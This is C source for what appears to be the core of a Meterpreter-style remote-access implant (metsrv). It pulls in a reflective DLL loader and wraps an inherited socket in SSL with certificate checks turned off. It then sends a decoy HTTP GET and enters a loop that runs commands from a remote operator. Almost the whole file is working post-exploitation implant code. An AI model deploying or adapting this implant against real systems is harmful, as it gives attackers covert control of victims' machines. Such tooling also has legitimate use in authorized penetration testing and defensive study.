#include "metsrv.h"

#ifdef _WIN32

#include <windows.h> // for EXCEPTION_ACCESS_VIOLATION 
#include <excpt.h> 


// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/ReflectiveLoader.c"

int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep) 
{
	return EXCEPTION_EXECUTE_HANDLER;
}

#define InitAppInstance() do {					\
		if( hAppInstance == NULL )		\
		    hAppInstance = GetModuleHandle( NULL );	\
	} while (0)

#else
#define InitAppInstance()
#define exceptionfilter(a, b)
#define SetHandleInformation(a, b, c)
#define ExitThread(x) exit((x))
#endif

// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor

#define PREPEND_ERROR "### Error: "
#define PREPEND_INFO  "### Info : "
#define PREPEND_WARN  "### Warn : "

static DWORD monitor_loop(Remote *remote);
static DWORD negotiate_ssl(Remote *remote);
static void ssl_debug_log( void *ctx, int level, char *str );
static void flush_socket(Remote *remote);

DWORD server_setup(SOCKET fd)
{
	Remote *remote = NULL;
	DWORD res = 0;
#ifdef _UNIX
	int local_error = 0;
#endif
	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	InitAppInstance();
	srand((unsigned int)time(NULL));
	
	__try 
	{

	do
	{
		if (!(remote = remote_allocate(fd)))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Do not allow the file descriptor to be inherited by child 
		// processes
		SetHandleInformation((HANDLE)fd, HANDLE_FLAG_INHERIT, 0);

		// Flush the socket handle
		dprintf("Flushing the socket handle...");
		flush_socket(remote);

		// Initialize SSL on the socket
		dprintf("Negotiating SSL...");
		negotiate_ssl(remote);

		// Register extension dispatch routines
		dprintf("Registering dispatch routines...");		
		register_dispatch_routines();

		dprintf("Entering the monitor loop...");		
		// Keep processing commands
		res = monitor_loop(remote);
	
		dprintf("Deregistering dispatch routines...");		
		// Clean up our dispatch routines
		deregister_dispatch_routines();

	} while (0);

	dprintf("Closing down SSL...");
	SSL_free(remote->ssl);
	SSL_CTX_free(remote->ctx);

	if (remote)
		remote_deallocate(remote);
	}

	/* Invoke the fatal error handler */
	__except(exceptionfilter(GetExceptionCode(), GetExceptionInformation())) {
		dprintf("*** exception triggered!");
		ExitThread(0);
	}

	return res;
}


// Flush all pending data on the connected socket before doing SSL
static void flush_socket(Remote *remote) {
	fd_set fdread;
	DWORD ret;
	SOCKET fd;
    unsigned char buff[4096];

	fd = remote_get_fd(remote);
	while (1) {
		struct timeval tv;
		LONG data;

		FD_ZERO(&fdread);
		FD_SET(fd, &fdread);

		// Wait for up to one second for any errant socket data to appear
		tv.tv_sec  = 1;
		tv.tv_usec = 0;

		data = select(fd + 1, &fdread, NULL, NULL, &tv);
		if(data == 0) break;

		ret = recv(fd, buff, sizeof(buff), 0);
		dprintf("Flushed %d bytes from the buffer");
		continue;
	}
}
/*
 * Negotiate SSL on the socket
 */
static DWORD negotiate_ssl(Remote *remote)
{
	DWORD hres = ERROR_SUCCESS;
	SOCKET fd = remote_get_fd(remote);
    DWORD ret;
	
	SSL_load_error_strings();
	SSL_library_init();

	remote->meth = TLSv1_client_method();

	remote->ctx  = SSL_CTX_new(remote->meth);
	SSL_CTX_set_mode(remote->ctx, SSL_MODE_AUTO_RETRY);

	remote->ssl  = SSL_new(remote->ctx);
	SSL_set_verify(remote->ssl, SSL_VERIFY_NONE, NULL);
	    if (SSL_set_fd(remote->ssl, remote->fd) == 0) {
		    perror("set fd failed");
		    exit(1);
	    }
	    

	    if ((ret = SSL_connect(remote->ssl)) != 1) {
		    printf("connect failed %d\n", SSL_get_error(remote->ssl, ret));
		    exit(1);
	    }
	dprintf("Sending a HTTP GET request to the remote side...");
	if((ret = SSL_write(remote->ssl, "GET / HTTP/1.0\r\n\r\n", 18)) <= 0) {
		dprintf("SSL write failed during negotiation with return: %d (%d)", ret, 
			SSL_get_error(remote->ssl, ret));
	}

	dprintf("Completed writing the HTTP GET request: %d", ret);
	
	if(ret < 0)
		ExitThread(0);

	return(0);
}

/*
 * Monitor for requests and local waitable items in the scheduler
 */
static DWORD monitor_loop(Remote *remote)
{
	DWORD hres = ERROR_SUCCESS;
	SOCKET fd = remote_get_fd(remote);
	fd_set fdread;
    
	/*
	 * Read data locally and remotely
	 */
	while (1)
	{
		struct timeval tv;
		LONG data;

		FD_ZERO(&fdread);
		FD_SET(fd, &fdread);

		tv.tv_sec  = 0;
		tv.tv_usec = 100;

		data = select(fd + 1, &fdread, NULL, NULL, &tv);

		if (data > 0)
		{
			if ((hres = command_process_remote(remote, NULL)) != ERROR_SUCCESS)
				break;
		}
		else if (data < 0)
			break;

		// Process local scheduler items
		scheduler_run(remote, 0);
	}

	return hres;
}
